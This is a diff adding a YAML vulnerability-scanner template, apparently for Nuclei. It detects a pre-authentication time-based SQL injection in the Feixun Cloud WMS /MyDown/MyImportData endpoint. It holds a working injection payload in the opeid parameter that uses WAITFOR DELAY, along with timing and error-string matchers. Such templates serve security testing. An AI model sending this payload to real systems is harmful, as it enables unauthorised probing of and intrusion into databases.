@@ -1,0 +1,25 @@
+id: poc-yaml-feixuns-wms-myimportdata-sqli
+info:
+  name: 飞讯云-WMS /MyDown/MyImportData 前台SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:{{t1}}'--"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'Error querying database')"
+          - "contains(body, '未提供该参数')"
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
